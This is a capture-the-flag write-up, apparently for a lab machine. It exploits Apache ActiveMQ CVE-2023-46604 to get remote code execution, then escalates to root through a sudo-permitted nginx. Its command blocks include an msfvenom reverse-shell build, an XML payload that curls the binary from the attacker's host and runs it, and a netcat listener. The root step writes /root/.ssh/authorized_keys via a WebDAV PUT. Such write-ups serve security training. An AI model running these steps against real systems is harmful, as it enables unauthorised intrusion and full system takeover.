

Firstly, the Apache ActiveMQ is on a port which is not grabbed by my standard nmap command:

```
nmap -sC -sV {ip}
```

This is a more exhaustive nmap search of all ports sending at least 1000 packets per second, with the timing template being 'insane':

```
nmap -p- --min-rate=1000 -T4 {ip}
```

Then run nmap with the -sC and -sV flags against the ports you find.

There is a repo on github that with code to help us exploit the Apache ActiveMQ vulnerability CVE-2023-46606:

```
wget https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-
ActiveMQ/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ-main/
```

We need to create and ELF payload via msfvenom:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.48 LPORT=4444 -f elf -o test.elf
```

Edit the poc-linux.xml file, changing the ip address to the webserver:

```
<value>curl -s -o test.elf http://10.10.14.48:8001/test.elf; chmod +x
./test.elf; ./test.elf</value>
```

Start an http server and netcat listener

```
python3 -m http.server 8001 &
nc -lvvp 4444
```

Run the github repo:

```
go run main.go -i 10.129.230.87 -p 61616 -u http://10.10.14.48:8001/poc-linux.xml
```

This gets us user access to the attacking box.

For Privilege Escalation, we can run:

```
sudo -l 

/usr/sbin/nginx
```

We learn that this user can run the nginx configuration file. 

We create pwn.conf in a temp directory by typing the following into the terminal:

```
cat << EOF> /tmp/pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;

events {
        worker_connections 768;

}  
http {

    server {
        listen 1337;

        root /;
        autoindex on;

        dav_methods PUT;
    }

}
EOF
sudo nginx -c /tmp/pwn.conf
```

This was a challenge because normally I would use vim to create and edit a file, but I was not able to do this on the attacking box. After running `cat << EOF>> /tmp/pwn.conf`, I typed in the file above line by line, ending the input with EOF. This could be a useful technique in the future when editing with vim doesn't work on a target box.

We run the following commands to get root access:

```
$ssh-keygen

$curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"

$ssh -i root root@localhost

$whoami
root
```
I can get the root flag by running `cat /root/root.txt` 
